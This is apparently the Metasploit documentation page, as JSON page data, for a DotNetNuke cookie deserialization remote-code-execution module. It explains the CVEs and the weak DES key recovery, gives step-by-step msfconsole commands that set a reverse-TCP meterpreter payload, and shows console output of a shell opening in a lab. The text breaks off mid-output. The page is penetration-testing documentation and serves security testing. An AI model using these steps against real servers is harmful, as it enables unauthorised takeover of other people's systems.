{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/dnn_cookie_deserialization_rce","result":{"data":{"moduleMetadataJson":{"id":"e1ec5f72-7d66-57fb-8034-938466c4b937","name":"DotNetNuke Cookie Deserialization Remote Code Excecution","fullname":"exploit/windows/http/dnn_cookie_deserialization_rce","description":"This module exploits a deserialization vulnerability in DotNetNuke (DNN) versions 5.0.0 to 9.3.0-RC.\n        Vulnerable versions store profile information for users in the DNNPersonalization cookie as XML.\n        The expected structure includes a \"type\" attribute to instruct the server which type of object to create on deserialization.\n        The cookie is processed by the application whenever it attempts to load the current user's profile data.\n        This occurs when DNN is configured to handle 404 errors with its built-in error page (default configuration).\n        An attacker can leverage this vulnerability to execute arbitrary code on the system.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/dnn_cookie_deserialization_rce","documentationSlug":"/modules/documentation/exploit/windows/http/dnn_cookie_deserialization_rce","referencesSlug":"/modules/references/exploit/windows/http/dnn_cookie_deserialization_rce"},"documentation":{"html":"<p>This module exploits a deserialization vulnerability in DotNetNuke (DNN) versions 5.0.0 to 9.3.0-RC. Vulnerable versions store profile information for users in the DNNPersonalization cookie as XML.</p>\n<p>The expected structure includes a \"type\" attribute to instruct the server which type of object to create on deserialization. The cookie is processed by the application whenever it attempts to load the current user's profile data, which occurs when DNN is configured to handle 404 errors with its built-in error page (default configuration). An attacker can leverage this vulnerability to execute arbitrary code on the system.</p>\n<h3 id=\"dnn-v500---v910\" style=\"position:relative;\"><a href=\"#dnn-v500---v910\" aria-label=\"dnn v500   v910 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DNN v5.0.0 - v9.1.0</h3>\n<p>  <strong>CVE-2017-9822</strong>:</p>\n<p>  Directly exploitable.</p>\n<h3 id=\"dnn-v911---v921\" style=\"position:relative;\"><a href=\"#dnn-v911---v921\" aria-label=\"dnn v911   v921 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DNN v9.1.1 - v9.2.1</h3>\n<p>  <strong>CVE-2018-15811</strong>, <strong>CVE-2018-15812</strong>:</p>\n<p>  The patch for CVE-2017-9822 used a weak encryption algorithm (DES) and an encryption key of low entropy. Furthermore, if the target site is configured to use Verified Registration, the plaintext value of the registration verification code is exposed on the user profile page. Since the verification code is encrypted using the same algorithm and key as the DNNPersonalization cookie, a known-plaintext attack can be used to recover the key and re-exploit CVE-2017-9822 with an encrypted cookie. In some cases a valid .DOTNETNUKE session token may be required for exploitation (v9.2.0+)</p>\n<h3 id=\"dnn-v922---v930-rc\" style=\"position:relative;\"><a href=\"#dnn-v922---v930-rc\" aria-label=\"dnn v922   v930 rc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DNN v9.2.2 - v9.3.0-RC</h3>\n<p>  <strong>CVE-2018-18325</strong>, <strong>CVE-2018-18326</strong>:</p>\n<p>  The implemented patch for CVE-2018-15811 and CVE-2018-15812 did not prevent exploitation. The patch changed the encryption key used to encrypt and decrypt the DNNPersonalization cookie; however, this encryption key was still derived from the key used to encrypt and decrypt the registration verification code and the strength of the encryption algorithm was not increased (DES). Additional changes were made to prevent the full plaintext of the verification code from being disclosed. A partial plaintext value was still disclosed on the user profile page. Due to the project being open-source, it was possible to determine the format of the rest of the plaintext verification code. Using a list of obtained verification codes and the known partial plaintext value, it is possible to reduce the number of potential encryption keys through offline processing to a point where trying to re-exploit CVE-2017-9822 with each potential key becomes a feasible attack.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  On a Windows machine, download the \"Install\" package from here:</p>\n<p>  <a href=\"https://github.com/dnnsoftware/Dnn.Platform/releases/tag/v9.3.0-rc2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/dnnsoftware/Dnn.Platform/releases/tag/v9.3.0-rc2</a></p>\n<p>  Install packages for other versions can be downloaded from:</p>\n<p>  <code class=\"language-text\">https://github.com/dnnsoftware/Dnn.Platform/releases/tag/&lt;version number&gt;</code></p>\n<p>  Follow the installation instructions here for installing with ATTACHED DATABASE:</p>\n<p>  <a href=\"https://www.dnnsoftware.com/wiki/how-to-install-dotnetnuke\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.dnnsoftware.com/wiki/how-to-install-dotnetnuke</a></p>\n<p>  You will need SQL Server 2005/2008/2008R2/2012 or 2016 installed.</p>\n<p>  Log in as the super user account and make sure the 404 error page is set to the built-in 404 Error Page.\nTypically, this is already set as the default setting, but during testing I encountered an edge case where an issue during installation caused this value to be set to \"None Specified\".</p>\n<p>  Additionally, if you are testing this module from a machine other than the host that the application is installed on, you will need to configure the Site Alias so that it is accessible using a hostname other than <code class=\"language-text\">localhost</code>. Additional firewall rules may need to be configured to allow web access, depending on how you set up the applicaiton in IIS.</p>\n<p>  This module has been tested on DNN v7.0.0 - v9.3.0-RC running on Windows Server 2016.</p>\n<h3 id=\"v500---v910\" style=\"position:relative;\"><a href=\"#v500---v910\" aria-label=\"v500   v910 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v5.0.0 - v9.1.0</h3>\n<p>  No additional configuration required.</p>\n<h3 id=\"v911\" style=\"position:relative;\"><a href=\"#v911\" aria-label=\"v911 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v9.1.1+</h3>\n<p>  While logged in as the super user account, configure the application to use Verified registration. You will also need to configure the SMTP server settings to be valid in order to receive the registration email.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<h3 id=\"v500---v910-1\" style=\"position:relative;\"><a href=\"#v500---v910-1\" aria-label=\"v500   v910 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v5.0.0 - v9.1.0</h3>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/dnn_cookie_deserialization_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOST &lt;RHOST&gt;</code></li>\n<li>Do: <code class=\"language-text\">set RPORT &lt;RPORT&gt;</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD windows/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST &lt;LHOST&gt;</code></li>\n<li>Do: <code class=\"language-text\">set LPORT &lt;LPORT&gt;</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">The target appears to be vulnerable</code> in the console</li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li><strong>Verify</strong> that you get a meterpeter shell</li>\n</ol>\n<h3 id=\"v911-1\" style=\"position:relative;\"><a href=\"#v911-1\" aria-label=\"v911 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v9.1.1</h3>\n<ol>\n<li>Install the application</li>\n<li>Configure the application to use Verified Registration</li>\n<li>Configure the application's SMTP server settings so that it will send the registration email</li>\n<li>Register a new user account and copy the verification code in the link in the registration email</li>\n<li>Log in as the new user and navigate to the Edit Profile page. Note the <code class=\"language-text\">userId</code> url path parameter value</li>\n<li>Examine the page's source code and search for a <code class=\"language-text\">portalId</code> value that is a positive integer.</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/dnn_cookie_deserialization_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOST &lt;RHOST&gt;</code></li>\n<li>Do: <code class=\"language-text\">set RPORT &lt;RPORT&gt;</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD windows/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST &lt;LHOST&gt;</code></li>\n<li>Do: <code class=\"language-text\">set LPORT &lt;LPORT&gt;</code></li>\n<li>Do: <code class=\"language-text\">set VERIFICATION_CODE &lt;Verification Code&gt;</code></li>\n<li>Do: <code class=\"language-text\">set VERIFICATION_PLAIN &lt;{portalId}-{userId}&gt;</code></li>\n<li>Do: <code class=\"language-text\">set ENCRYPTED true</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">The target appears to be vulnerable</code> in the console</li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li><strong>Verify</strong> that you get a meterpeter shell</li>\n</ol>\n<h3 id=\"v920---v921\" style=\"position:relative;\"><a href=\"#v920---v921\" aria-label=\"v920   v921 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v9.2.0 - v9.2.1</h3>\n<ol>\n<li>Install the application</li>\n<li>Configure the application to use Verified Registration</li>\n<li>Configure the application's SMTP server settings so that it will send the registration email</li>\n<li>Register a new user account and copy the verification code in the link in the registration email</li>\n<li>Log in as the new user and navigate to the Edit Profile page. Note the <code class=\"language-text\">userId</code> url path parameter value</li>\n<li>Examine the Edit Profile page's source code and search for a <code class=\"language-text\">portalId</code> value that is a positive integer.</li>\n<li>While logged in, examine your cookies using the browser's developer tools or by other means. Copy the value of the <code class=\"language-text\">.DOTNETNUKE</code> cookie value.</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/dnn_cookie_deserialization_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOST &lt;RHOST&gt;</code></li>\n<li>Do: <code class=\"language-text\">set RPORT &lt;RPORT&gt;</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD windows/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST &lt;LHOST&gt;</code></li>\n<li>Do: <code class=\"language-text\">set LPORT &lt;LPORT&gt;</code></li>\n<li>Do: <code class=\"language-text\">set VERIFICATION_CODE &lt;Verification Code&gt;</code></li>\n<li>Do: <code class=\"language-text\">set VERIFICATION_PLAIN &lt;{portalId}-{userId}&gt;</code></li>\n<li>Do: <code class=\"language-text\">set ENCRYPTED true</code></li>\n<li>Do: <code class=\"language-text\">set SESSION_TOKEN &lt;.DOTNETNUKE cookie value&gt;</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">The target appears to be vulnerable</code> in the console</li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li><strong>Verify</strong> that you get a meterpeter shell</li>\n</ol>\n<h3 id=\"v922---930-rc\" style=\"position:relative;\"><a href=\"#v922---930-rc\" aria-label=\"v922   930 rc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v9.2.2 - 9.3.0-RC</h3>\n<p>  In these versions, the <code class=\"language-text\">userId</code> value was changed to be a randomly generated GUID. This means that only the first part of the verification plaintext is known. By providing a list of several verification codes, it is possible to reduce the nubmer of potential encryption key values to a feasible amount. Once the list of encryption keys has been reduced, the module will test each key until an HTTP callback is received on port <code class=\"language-text\">8080</code> that indicates which key worked. Then, the final exploit payload will be encrypted using the recovered key and sent to the server, resulting in a shell.</p>\n<ol>\n<li>Install the application</li>\n<li>Configure the application to use Verified Registration</li>\n<li>Configure the application's SMTP server settings so that it will send the registration email</li>\n<li>Register several new user accounts and note the verification codes in the link in the registration emails</li>\n<li>Log in as the new user and navigate to the Edit Profile page.</li>\n<li>Examine the Edit Profile page's source code and search for a <code class=\"language-text\">portalId</code> value that is a positive integer</li>\n<li>While logged in, examine your cookies using the browser's developer tools or by other means. Copy the value of the <code class=\"language-text\">.DOTNETNUKE</code> cookie value.</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/dnn_cookie_deserialization_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOST &lt;RHOST&gt;</code></li>\n<li>Do: <code class=\"language-text\">set RPORT &lt;RPORT&gt;</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD windows/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST &lt;LHOST&gt;</code></li>\n<li>Do: <code class=\"language-text\">set LPORT &lt;LPORT&gt;</code></li>\n<li>Do: <code class=\"language-text\">set VERIFICATION_CODE &lt;full path to file containing verification codes&gt;</code></li>\n<li>Do: <code class=\"language-text\">set VERIFICATION_PLAIN &lt;{portalId}-&gt;</code></li>\n<li>Do: <code class=\"language-text\">set ENCRYPTED true</code></li>\n<li>Do: <code class=\"language-text\">set SESSION_TOKEN &lt;.DOTNETNUKE cookie value&gt;</code></li>\n<li>Do: <code class=\"language-text\">set TARGET 4</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">The target appears to be vulnerable</code> in the console.</li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li><strong>Verify</strong> that you get a meterpeter shell </li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>DryRun</strong></p>\n<p>  Set this to <code class=\"language-text\">true</code> to generate a payload, but not send the exploit to the target server. Default value is <code class=\"language-text\">false</code>.</p>\n<p>  <strong>ENCRYPTED</strong></p>\n<p>  Set this to <code class=\"language-text\">true</code> for targets running v9.1.1+. Default value is <code class=\"language-text\">false</code>.</p>\n<p>  <strong>IV</strong></p>\n<p>  The initialization vector to use for encrypting the payload. If specified along with <code class=\"language-text\">KEY</code>, <code class=\"language-text\">VERIFICATION_CODE</code> and <code class=\"language-text\">VERIFICATION_PLAIN</code> options will be ignored.</p>\n<p>  <strong>KEY</strong></p>\n<p>  The key to use for encryption. If specified along with <code class=\"language-text\">IV</code>, <code class=\"language-text\">VERIFICATION_CODE</code> and <code class=\"language-text\">VERIFICATION_PLAIN</code> options will be ignored.</p>\n<p>  <strong>SESSION_TOKEN</strong></p>\n<p>  The .DOTNETNUKE session cookie value to use when submitting the payload to the server. Required for targets running v9.2.0+.</p>\n<p>  <strong>SRVPORT</strong></p>\n<p>  The server port to listen for HTTP callbacks on when testing encryption passphrases for targets running v9.2.2 - v9.3.0-RC. Default value is <code class=\"language-text\">8080</code></p>\n<p>  <strong>TARGETURI</strong></p>\n<p>  Path to a page that will result in a DNN 404 Error Page. The default location is <code class=\"language-text\">/__</code></p>\n<p>  <strong>VERIFICATION_CODE</strong></p>\n<p>  The verification code received in an email, or the full path to a file containing multiple verification codes.</p>\n<p>  <strong>VERIFICATION_PLAIN</strong></p>\n<p>  The known (full or partial) plaintext of the encrypted verification code. Typically in the format of {portalID}-{userID} where portalID is an integer and userID is either an integer (v9.1.1 - v9.2.1) or GUID (v9.2.2+). </p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"v510---v910\" style=\"position:relative;\"><a href=\"#v510---v910\" aria-label=\"v510   v910 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v5.1.0 - v9.1.0</h3>\n<p>  Here's showing the expected output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/http/dnn_cookie_deserialization_rce \nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set RHOSTS 192.168.31.131\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set RPORT 8083\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set LHOST 192.168.31.128\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set LPORT 443\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; check\n\n[*] Trying to determine DNN Version...\n[*] Checking version at /Documentation/License.txt ...\n[+] DNN Version Found: v5.1.0 - v9.0.1\n[*] Checking for custom error page at: /__ ...\n[+] Custom error page detected.\n[*] 192.168.31.131:8083 - The target appears to be vulnerable.\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; exploit\n\n[*] Checking for custom error page at: /__ ...\n[+] Custom error page detected.\n[*] Started reverse TCP handler on 192.168.31.128:443 \n[*] Sending Exploit Payload to: /__ ...\n[*] Sending stage (179779 bytes) to 192.168.31.131\n[*] Meterpreter session 1 opened (192.168.31.128:443 -&gt; 192.168.31.131:49957) at 2019-07-10 14:02:09 -0400\n\nmeterpreter &gt; sysinfo\nComputer        : SERVER_NAME\nOS              : Windows 2016 (Build 14393).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"v911-2\" style=\"position:relative;\"><a href=\"#v911-2\" aria-label=\"v911 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>v9.1.1</h3>\n<p>  Here's showing the expected output</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/http/dnn_cookie_deserialization_rce \nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set RHOSTS 192.168.31.131\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set RPORT 8084\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set LHOST 192.168.31.128\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set LPORT 443\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set VERIFICATION_CODE Amop-0Et1fM_\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set VERIFICATION_PLAIN 0-2\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; set ENCRYPTED true\nmsf5 exploit(windows/http/dnn_cookie_deserialization_rce) &gt; check\n\n[*] Trying to determine DNN Version...\n[*] Checking version at /Documentation/License.txt ...\n[!] DNN Version Found: v9.0.1 - v9.1.1 - May require ENCRYPTED\n[*] Checking for custom error page at: /__ ...\n[+] Custom error page detected.\n[*] 192.168.31.131:8084 - The target appears to be vulnerable.\nmsf5 